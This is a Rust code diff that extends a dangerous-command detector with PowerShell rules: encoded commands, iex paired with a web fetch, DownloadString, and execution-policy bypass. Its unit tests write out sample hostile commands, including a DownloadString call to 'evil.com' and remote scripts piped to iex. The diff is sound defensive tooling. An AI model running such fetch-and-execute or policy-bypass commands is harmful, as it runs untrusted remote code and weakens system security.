@@ -203,6 +203,36 @@ fn contains_windows_dangerous_pattern(command: &str) -> Option<&'static str> {
         return Some("PowerShell download executed as code");
     }
 
+    // Encoded payload — the entire script is base64-blobbed to bypass
+    // visual inspection. This is a near-universal red flag.
+    if command.contains("-encodedcommand") || command.contains("-enc ") {
+        return Some("PowerShell -EncodedCommand (obfuscated payload)");
+    }
+
+    // The `(iex (irm ...))` / `(iex (iwr ...))` pattern — pull a script off
+    // the web and immediately execute it without saving or inspecting it.
+    if (command.contains("iex") || command.contains("invoke-expression"))
+        && (command.contains("irm")
+            || command.contains("invoke-restmethod")
+            || command.contains("iwr")
+            || command.contains("invoke-webrequest")
+            || command.contains("downloadstring"))
+    {
+        return Some("PowerShell remote-fetch piped to iex (RCE pattern)");
+    }
+
+    // `DownloadString` on its own is almost always part of the same pipe.
+    if command.contains("downloadstring") {
+        return Some("PowerShell DownloadString (remote payload fetch)");
+    }
+
+    // Globally relaxing the execution policy lets ANY future script run.
+    if command.contains("set-executionpolicy")
+        && (command.contains("bypass") || command.contains("unrestricted"))
+    {
+        return Some("PowerShell Set-ExecutionPolicy Bypass/Unrestricted");
+    }
+
     if command.contains("remove-item")
         && command.contains(" -recurse ")
         && mentions_sensitive_windows_target(command)
@@ -301,6 +331,35 @@ pub fn escape_for_display(command: &str) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn test_powershell_encoded_command_flagged() {
+        assert!(contains_dangerous_pattern("powershell -EncodedCommand JABzAGUAcgB").is_some());
+        assert!(contains_dangerous_pattern("pwsh -enc JABz").is_some());
+    }
+
+    #[test]
+    fn test_powershell_remote_iex_pattern_flagged() {
+        assert!(contains_dangerous_pattern("iex (irm https://example.com/install.ps1)").is_some());
+        assert!(contains_dangerous_pattern(
+            "Invoke-Expression (Invoke-WebRequest -Uri http://x.com).Content"
+        )
+        .is_some());
+    }
+
+    #[test]
+    fn test_powershell_downloadstring_flagged() {
+        assert!(contains_dangerous_pattern(
+            "(New-Object Net.WebClient).DownloadString('http://evil.com')"
+        )
+        .is_some());
+    }
+
+    #[test]
+    fn test_powershell_executionpolicy_bypass_flagged() {
+        assert!(contains_dangerous_pattern("Set-ExecutionPolicy Bypass -Scope Process").is_some());
+        assert!(contains_dangerous_pattern("set-executionpolicy unrestricted -force").is_some());
+    }
 
     #[test]
     fn test_dangerous_pattern_detection() {
